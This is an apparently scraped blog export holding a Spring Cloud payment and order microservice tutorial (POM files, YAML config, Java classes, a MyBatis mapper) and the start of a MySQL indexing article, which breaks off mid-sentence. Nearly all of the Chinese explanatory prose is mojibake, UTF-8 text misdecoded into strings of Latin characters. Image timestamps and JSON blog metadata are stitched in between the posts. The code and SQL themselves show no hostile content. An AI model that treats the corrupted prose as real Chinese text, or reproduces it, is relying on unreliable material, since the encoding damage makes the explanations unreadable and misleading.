äºåˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„ æœåŠ¡æ„å»º 1596435570897 SpringCloudåˆ†å¸ƒå¼å¾®æœåŠ¡æ¶æ„çš„ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆï¼Œæ˜¯å¤šç§å¾®æœåŠ¡æ¶æ„è½åœ°æŠ€æœ¯çš„é›†åˆä½“ï¼Œä¿—ç§°å¾®æœåŠ¡å…¨å®¶æ¡¶ã€‚ ç‰ˆæœ¬ä¾èµ–1596438103877 jsonè½¬æ¢ï¼šhttps://start.spring.io/actuator/info 1596438285925 å·¥ç¨‹æ„å»ºï¼šå¾®æœåŠ¡cloudæ•´ä½“èšåˆçˆ¶å·¥ç¨‹Project new 1596443668556 1596443735586 å­—ç¬¦ç¼–ç  1596444025257 æ³¨è§£ç”Ÿæ•ˆæ¿€æ´» 1596444143044 javaç¼–è¯‘8 1596444232866 ç¾è§‚ï¼Œè¿‡æ»¤æ–‡ä»¶*.idea;*.iml; 1596447127885 pom æ·»åŠ ä¸€è¡Œ &lt;packaging&gt;pom&lt;/packaging&gt; &lt;!--ç»Ÿä¸€ç®¡ç†jaråŒ…ç‰ˆæœ¬--&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;lombok.version&gt;1.16.18&lt;/lombok.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mysql.version&gt;5.1.47&lt;/mysql.version&gt; &lt;druid.version&gt;1.1.16&lt;/druid.version&gt; &lt;mybatis.spring.boot.version&gt;1.3.0&lt;/mybatis.spring.boot.version&gt; &lt;/properties&gt; &lt;!--å­æ¨¡å—ç»§æ‰¿ä¹‹åï¼Œæä¾›ä½œç”¨ï¼šé”å®šç‰ˆæœ¬+å­moduleä¸ç”¨è°¢groupIdå’Œversion--&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--spring boot 2.2.2--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud Hoxton.SR1--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud é˜¿é‡Œå·´å·´--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;2.1.0.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql.version}&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--junit--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;${junit.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--log4j--&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; 1596445604540 å­é¡¹ç›®pomï¼š 1596445680179 è·³è¿‡testï¼š 1596445923329 Restå¾®æœåŠ¡å·¥ç¨‹æ„å»ºæ–°å»ºæ¨¡å—cloud-provider-payment8001 pom.xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; åˆ›å»ºapplication.yml server: port: 8001 spring: application: name: cloud-payment-service datasource: type: com.alibaba.druid.pool.DruidDataSource #å½“å‰æ•°æ®æºæ“ä½œç±»å‹ driver-class-name: org.gjt.mm.mysql.Driver #mysqlé©±åŠ¨åŒ… url: jdbc:mysql://localhost:3306/cloud?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false username: root password: admin mybatis: mapperLocations: classpath:mapper/*.xml type-aliases-package: com.kayleh.springcloud.entities #æ‰€æœ‰Entityåˆ«åç±»æ‰€åœ¨åŒ… ä¸»å¯åŠ¨ç±» package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; /** * @Author: Wizard * @Date: 2020/8/3 18:10 */ @SpringBootApplication public class PaymentMain8001 { public static void main(String[] args) { SpringApplication.run(PaymentMain8001.class, args); } } ä¸šåŠ¡ç±»å»ºè¡¨SQL CREATE TABLE `payment`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;, `serial` VARCHAR(200) DEFAULT &#39;&#39;, PRIMARY KEY(`id`) )ENGINE=INNODB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; entities ä¸»å®ä½“ç±» package com.kayleh.springcloud.entities; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.io.Serializable; /** * @Author: Wizard * @Date: 2020/8/3 21:23 */ @Data @AllArgsConstructor @NoArgsConstructor public class Payment implements Serializable { private Long id; private String serial; } Jsonå°è£…ä½“ package com.kayleh.springcloud.entities; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; /** * @Author: Wizard * @Date: 2020/8/3 21:27 */ @Data @AllArgsConstructor @NoArgsConstructor public class CommonResult&lt;T&gt; { //404 not_found private Integer code; private String message; private T data; public CommonResult(Integer code, String message) { this(code, message, null); } } DAO package com.kayleh.springcloud.dao; import com.kayleh.springcloud.entities.Payment; import org.apache.ibatis.annotations.Mapper; import org.apache.ibatis.annotations.Param; /** * @Author: Wizard * @Date: 2020/8/3 23:23 */ @Mapper public interface PaymentDao { public int create(Payment payment); public Payment getPaymentById(@Param(&quot;id&quot;) Long id); } PaymentMapper.xml(resourcesç›®å½•ä¸‹çš„mapperç›®å½•) &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTO Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt; &lt;mapper namespace=&quot;com.kayleh.springcloud.dao.PaymentDao&quot;&gt; &lt;!-- idå¯¹åº”æ¥å£çš„ç±»å--&gt; &lt;!-- parameterTypeå¯¹åº”ç±»çš„å‚æ•°ç±»å‹--&gt; &lt;!-- useGeneratedKeysä½¿ç”¨ç”Ÿæˆçš„ä¸»é”®--&gt; &lt;!-- keyPropertyä¸»é”®æ˜¯id--&gt; &lt;insert id=&quot;create&quot; parameterType=&quot;Payment&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot;&gt; insert into payment(serial) values (#{serial}); &lt;/insert&gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.kayleh.springcloud.entities.Payment&quot;&gt; &lt;!--column å¯¹åº”æ•°æ®åº“çš„åˆ—å property å¯¹åº”javaå®ä½“ç±»çš„å±æ€§å jdbcType åœ¨æ•°æ®åº“çš„ç±»å‹--&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;id column=&quot;serial&quot; property=&quot;serial&quot; jdbcType=&quot;VARCHAR&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getPaymentById&quot; parameterType=&quot;Long&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from payment where id = #{id}; &lt;/select&gt; &lt;/mapper&gt; PaymentService package com.kayleh.springcloud.service; import com.kayleh.springcloud.entities.Payment; import org.apache.ibatis.annotations.Param; /** * @Author: Wizard * @Date: 2020/8/3 23:58 */ public interface PaymentService { public int create(Payment payment); public Payment getPaymentById(@Param(&quot;id&quot;) Long id); } PaymentServiceImpl package com.kayleh.springcloud.service.impl; import com.kayleh.springcloud.dao.PaymentDao; import com.kayleh.springcloud.entities.Payment; import com.kayleh.springcloud.service.PaymentService; import org.springframework.stereotype.Service; import javax.annotation.Resource; /** * @Author: Wizard * @Date: 2020/8/4 0:00 */ @Service public class PaymentServiceImpl implements PaymentService { // @Resouceçº¿ç¨‹å®‰å…¨,æ˜¯javaè‡ªå¸¦çš„ã€‚ // @Autowiredæ˜¯Springçš„ @Resource PaymentDao paymentDao; @Override public int create(Payment payment) { return paymentDao.create(payment); } @Override public Payment getPaymentById(Long id) { return paymentDao.getPaymentById(id); } } PaymentController package com.kayleh.springcloud.controller; import com.kayleh.springcloud.entities.CommonResult; import com.kayleh.springcloud.entities.Payment; import com.kayleh.springcloud.service.PaymentService; import lombok.extern.slf4j.Slf4j; import org.apache.ibatis.annotations.Param; import org.springframework.web.bind.annotation.*; import javax.annotation.Resource; /** * @Author: Wizard * @Date: 2020/8/4 0:07 */ @RestController @Slf4j public class PaymentController { @Resource private PaymentService paymentService; @PostMapping(value = &quot;/payment/create&quot;) public CommonResult create(@RequestBody Payment payment) { int result = paymentService.create(payment); log.info(&quot;-------æ’å…¥ç»“æœ------&quot; + result); if (result &gt; 0) { return new CommonResult(200, &quot;æ’å…¥æ•°æ®åº“æˆåŠŸ&quot;, result); } else { return new CommonResult(444, &quot;æ’å…¥æ•°æ®åº“å¤±è´¥&quot;, null); } } @GetMapping(value = &quot;/payment/get/{id}&quot;) public CommonResult getPaymentById(@PathVariable(&quot;id&quot;) Long id) { Payment payment = paymentService.getPaymentById(id); log.info(&quot;-------æ’å…¥ç»“æœ------&quot; + payment); if (payment != null) { return new CommonResult(200, &quot;æŸ¥è¯¢æˆåŠŸ&quot;, payment); } else { return new CommonResult(444, &quot;æ²¡æœ‰å¯¹åº”è®°å½•,æŸ¥è¯¢id:&quot; + id, null); } } } æ¶ˆè´¹è€…è®¢å•modelæ–°å»ºå·¥ç¨‹cloud-consumer-order80 pom.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;parent&gt; &lt;artifactId&gt;cloud&lt;/artifactId&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;cloud-consumer-order80&lt;/artifactId&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- çƒ­éƒ¨ç½²--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/project&gt; application.yml server: port: 80 æ‹·è´paymentæ¨¡å—çš„å®ä½“ç±»entities å¯åŠ¨ç±» package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; /** * @Author: Wizard * @Date: 2020/8/4 11:20 */ @SpringBootApplication public class OrderMain80 { public static void main(String[] args) { SpringApplication.run(OrderMain80.class, args); } } RestTemplateRestTemplateæä¾›äº†å¤šç§ä¾¿æ·è®¿é—®è¿œç¨‹HTTPè®¿é—®çš„æ–¹æ³•,æ˜¯ä¸€ç§ç®€å•ä¾¿æ·çš„è®¿é—®restfulæœåŠ¡æ¨¡å—ç±»,æ˜¯Springæä¾›çš„ç”¨äºè®¿é—®RestæœåŠ¡çš„å®¢æˆ·ç«¯æ¨¡å—å·¥å…·é›†. (url,requestMap,ResponseBean.class)ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä»£è¡¨ RESTè¯·æ±‚åœ°å€ã€è¯·æ±‚å‚æ•°ã€HTTPå“åº”è½¬æ¢è¢«è½¬æ¢æˆçš„å¯¹è±¡ç±»å‹ã€‚ 1596517192511 RestTemplate package com.kayleh.springcloud.config; import org.springframework.beans.factory.annotation.Configurable; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.client.RestTemplate; /** * @Author: Wizard * @Date: 2020/8/4 12:54 */ @Configuration public class ApplicationContextConfig { @Bean public RestTemplate getRestTemplate() { return new RestTemplate(); } } OrderController package com.kayleh.springcloud.controller; import com.kayleh.springcloud.entities.CommonResult; import com.kayleh.springcloud.entities.Payment; import lombok.extern.slf4j.Slf4j; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.client.RestTemplate; import javax.annotation.Resource; /** * @Author: Wizard * @Date: 2020/8/4 11:24 */ @RestController @Slf4j public class OrderController { public static final String PAYMENT_URL = &quot;http://localhost:8001&quot;; @Resource private RestTemplate restTemplate; @GetMapping(&quot;/consumer/payment/create&quot;) public CommonResult&lt;Payment&gt; create(Payment payment) { return restTemplate.postForObject(PAYMENT_URL + &quot;/payment/create&quot;, payment, CommonResult.class); } @GetMapping(&quot;/consumer/payment/get/{id}&quot;) public CommonResult&lt;Payment&gt; getPayment(@PathVariable(&quot;id&quot;) Long id) { return restTemplate.getForObject(PAYMENT_URL + &quot;/payment/get/&quot; + id, CommonResult.class); } } å³å¯è°ƒç”¨å¦ä¸€ä¸ªå¾®æœåŠ¡æ¨¡å— é‡æ„, å®ä½“ç±»entitieså…±ç”¨ æ–°å»ºå·¥ç¨‹cloud-api-commons pom.xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;5.1.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; æ‹·è´paymentæ¨¡å—çš„å®ä½“ç±»entities é€‰ä¸­è¿™ä¸ªæ¨¡å—,ä½¿ç”¨maven cleanå’Œinstall ç„¶ååœ¨consumeræ¨¡å—å¼•å…¥pomåæ ‡ &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; cloud-provider-payment8001æ¨¡å—ä¹Ÿæ˜¯è¿™æ ·åš.","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"MYSQL","slug":"MYSQL","date":"2020-08-02T06:54:25.000Z","updated":"2021-04-11T17:11:28.319Z","comments":true,"path":"MYSQL/","link":"","permalink":"https://blog.kayleh.top/MYSQL/","excerpt":"MYSQLç´¢å¼•","text":"MYSQLç´¢å¼• MySQLç´¢å¼•çš„å»ºç«‹å¯¹äºMySQLçš„é«˜æ•ˆè¿è¡Œæ˜¯å¾ˆé‡è¦çš„ï¼Œç´¢å¼•å¯ä»¥å¤§å¤§æé«˜MySQLçš„æ£€ç´¢é€Ÿåº¦ã€‚ æ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœåˆç†çš„è®¾è®¡ä¸”ä½¿ç”¨ç´¢å¼•çš„MySQLæ˜¯ä¸€è¾†å…°åšåŸºå°¼çš„è¯ï¼Œé‚£ä¹ˆæ²¡æœ‰è®¾è®¡å’Œä½¿ç”¨ç´¢å¼•çš„MySQLå°±æ˜¯ä¸€ä¸ªäººåŠ›ä¸‰è½®è½¦ã€‚ æ‹¿æ±‰è¯­å­—å…¸çš„ç›®å½•é¡µï¼ˆç´¢å¼•ï¼‰æ‰“æ¯”æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰æ‹¼éŸ³ã€ç¬”ç”»ã€åæ—éƒ¨é¦–ç­‰æ’åºçš„ç›®å½•ï¼ˆç´¢å¼•ï¼‰å¿«é€ŸæŸ¥æ‰¾åˆ°éœ€è¦çš„å­—ã€‚ ç´¢å¼•åˆ†å•åˆ—ç´¢å¼•å’Œç»„åˆç´¢å¼•ã€‚å•åˆ—ç´¢å¼•ï¼Œå³ä¸€ä¸ªç´¢å¼•åªåŒ…å«å•ä¸ªåˆ—ï¼Œä¸€ä¸ªè¡¨å¯ä»¥æœ‰å¤šä¸ªå•åˆ—ç´¢å¼•ï¼Œä½†è¿™ä¸æ˜¯ç»„åˆç´¢å¼•ã€‚ç»„åˆç´¢å¼•ï¼Œå³ä¸€ä¸ªç´¢å¼•åŒ…å«å¤šä¸ªåˆ—ã€‚ åˆ›å»ºç´¢å¼•æ—¶ï¼Œä½ éœ€è¦ç¡®ä¿è¯¥ç´¢å¼•æ˜¯åº”ç”¨åœ¨ SQL æŸ¥è¯¢è¯­å¥çš„æ¡ä»¶(ä¸€èˆ¬ä½œä¸º WHERE å­å¥çš„æ¡ä»¶)ã€‚ å®é™…ä¸Šï¼Œç´¢å¼•ä¹Ÿæ˜¯ä¸€å¼ è¡¨ï¼Œè¯¥è¡¨ä¿å­˜äº†ä¸»é”®ä¸ç´¢å¼•å­—æ®µï¼Œå¹¶æŒ‡å‘å®ä½“è¡¨çš„è®°å½•ã€‚ ä¸Šé¢éƒ½åœ¨è¯´ä½¿ç”¨ç´¢å¼•çš„å¥½å¤„ï¼Œä½†è¿‡å¤šçš„ä½¿ç”¨ç´¢å¼•å°†ä¼šé€ æˆæ»¥ç”¨ã€‚å› æ­¤ç´¢å¼•ä¹Ÿä¼šæœ‰å®ƒçš„ç¼ºç‚¹ï¼šè™½ç„¶ç´¢å¼•å¤§å¤§æé«˜äº†æŸ¥è¯¢é€Ÿåº¦ï¼ŒåŒæ—¶å´ä¼šé™ä½æ›´æ–°è¡¨çš„é€Ÿåº¦ï¼Œå¦‚å¯¹è¡¨è¿›è¡ŒINSERTã€UPDATEå’ŒDELETEã€‚å› ä¸ºæ›´æ–°è¡¨æ—¶ï¼ŒMySQLä¸ä»…è¦ä¿å­˜æ•°æ®ï¼Œè¿˜è¦ä¿å­˜ä¸€ä¸‹ç´¢å¼•æ–‡ä»¶ã€‚ å»ºç«‹ç´¢å¼•ä¼šå ç”¨ç£ç›˜ç©ºé—´çš„ç´¢å¼•æ–‡ä»¶ã€‚ æ™®é€šç´¢å¼•åˆ›å»ºç´¢å¼•è¿™æ˜¯æœ€åŸºæœ¬çš„ç´¢å¼•ï¼Œå®ƒæ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚å®ƒæœ‰ä»¥ä¸‹å‡ ç§åˆ›å»ºæ–¹å¼ï¼š CREATE INDEX indexName ON mytable(username(length)); å¦‚æœæ˜¯CHARï¼ŒVARCHARç±»å‹ï¼Œlengthå¯ä»¥å°äºå­—æ®µå®é™…é•¿åº¦ï¼›å¦‚æœæ˜¯BLOBå’ŒTEXTç±»å‹ï¼Œå¿…é¡»æŒ‡å®š lengthã€‚ ä¿®æ”¹è¡¨ç»“æ„(æ·»åŠ ç´¢å¼•)ALTER table tableName ADD INDEX indexName(columnName) åˆ›å»ºè¡¨çš„æ—¶å€™ç›´æ¥æŒ‡å®šCREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) ); åˆ é™¤ç´¢å¼•çš„è¯­æ³•DROP INDEX [indexName] ON mytable; å”¯ä¸€ç´¢å¼•å®ƒä¸å‰é¢çš„æ™®é€šç´¢å¼•ç±»ä¼¼ï¼Œä¸åŒçš„å°±æ˜¯ï¼šç´¢å¼•åˆ—çš„å€¼å¿…é¡»å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ã€‚å¦‚æœæ˜¯ç»„åˆç´¢å¼•ï¼Œåˆ™åˆ—å€¼çš„ç»„åˆå¿…é¡»å”¯ä¸€ã€‚å®ƒæœ‰ä»¥ä¸‹å‡ ç§åˆ›å»ºæ–¹å¼ï¼š åˆ›å»ºç´¢å¼•CREATE UNIQUE INDEX indexName ON mytable(username(length)) ä¿®æ”¹è¡¨ç»“æ„ALTER table mytable ADD UNIQUE [indexName] (username(length)) åˆ›å»ºè¡¨çš„æ—¶å€™ç›´æ¥æŒ‡å®šCREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, UNIQUE [indexName] (username(length)) ); ä½¿ç”¨ALTER å‘½ä»¤æ·»åŠ å’Œåˆ é™¤ç´¢å¼•æœ‰å››ç§æ–¹å¼æ¥æ·»åŠ æ•°æ®è¡¨çš„ç´¢å¼•ï¼š ALTER TABLE tbl_name ADD PRIMARY KEY (column_list): è¯¥è¯­å¥æ·»åŠ ä¸€ä¸ªä¸»é”®ï¼Œè¿™æ„å‘³ç€ç´¢å¼•å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œä¸”ä¸èƒ½ä¸ºNULLã€‚ ALTER TABLE tbl_name ADD UNIQUE index_name (column_list): è¿™æ¡è¯­å¥åˆ›å»ºç´¢å¼•çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼ˆé™¤äº†NULLå¤–ï¼ŒNULLå¯èƒ½ä¼šå‡ºç°å¤šæ¬¡ï¼‰ã€‚ ALTER TABLE tbl_name ADD INDEX index_name (column_list): æ·»åŠ æ™®é€šç´¢å¼•ï¼Œç´¢å¼•å€¼å¯å‡ºç°å¤šæ¬¡ã€‚ ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list): è¯¥è¯­å¥æŒ‡å®šäº†ç´¢å¼•ä¸º FULLTEXT ï¼Œç”¨äºå…¨æ–‡ç´¢å¼•ã€‚ ä»¥ä¸‹å®ä¾‹ä¸ºåœ¨è¡¨ä¸­æ·»åŠ ç´¢å¼•ã€‚ mysql&gt; ALTER TABLE testalter_tbl ADD INDEX (c); ä½ è¿˜å¯ä»¥åœ¨ ALTER å‘½ä»¤ä¸­ä½¿ç”¨ DROP å­å¥æ¥åˆ é™¤ç´¢å¼•ã€‚å°è¯•ä»¥ä¸‹å®ä¾‹åˆ é™¤ç´¢å¼•: mysql&gt; ALTER TABLE testalter_tbl DROP INDEX c; ä½¿ç”¨ ALTER å‘½ä»¤æ·»åŠ å’Œåˆ é™¤ä¸»é”®ä¸»é”®åªèƒ½ä½œç”¨äºä¸€ä¸ªåˆ—ä¸Šï¼Œæ·»åŠ ä¸»é”®ç´¢å¼•æ—¶ï¼Œä½ éœ€è¦ç¡®ä¿è¯¥ä¸»é”®é»˜è®¤ä¸ä¸ºç©ºï¼ˆNOT NULLï¼‰ã€‚å®ä¾‹å¦‚ä¸‹ï¼š mysql&gt; ALTER TABLE testalter_tbl MODIFY i INT NOT NULL; mysql&gt; ALTER TABLE testalter_tbl ADD PRIMARY KEY (i); ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ ALTER å‘½ä»¤åˆ é™¤ä¸»é”®ï¼š mysql&gt; ALTER TABLE testalter_tbl DROP PRIMARY KEY; åˆ é™¤ä¸»é”®æ—¶åªéœ€æŒ‡å®šPRIMARY KEYï¼Œä½†åœ¨åˆ é™¤ç´¢å¼•æ—¶ï¼Œä½ å¿…é¡»çŸ¥é“ç´¢å¼•åã€‚ æ˜¾ç¤ºç´¢å¼•ä¿¡æ¯ä½ å¯ä»¥ä½¿ç”¨ SHOW INDEX å‘½ä»¤æ¥åˆ—å‡ºè¡¨ä¸­çš„ç›¸å…³çš„ç´¢å¼•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æ·»åŠ  \\G æ¥æ ¼å¼åŒ–è¾“å‡ºä¿¡æ¯ã€‚ å°è¯•ä»¥ä¸‹å®ä¾‹: mysql&gt; SHOW INDEX FROM table_name; \\G ........ MySQL ä¸´æ—¶è¡¨ MySQL ä¸´æ—¶è¡¨åœ¨æˆ‘ä»¬éœ€è¦ä¿å­˜ä¸€äº›ä¸´æ—¶æ•°æ®æ—¶æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ä¸´æ—¶è¡¨åªåœ¨å½“å‰è¿æ¥å¯è§ï¼Œå½“å…³é—­è¿æ¥æ—¶ï¼ŒMysqlä¼šè‡ªåŠ¨åˆ é™¤è¡¨å¹¶é‡Šæ”¾æ‰€æœ‰ç©ºé—´ã€‚ä¸´æ—¶è¡¨åœ¨MySQL 3.23ç‰ˆæœ¬ä¸­æ·»åŠ ï¼Œå¦‚æœä½ çš„MySQLç‰ˆæœ¬ä½äº 3.23ç‰ˆæœ¬å°±æ— 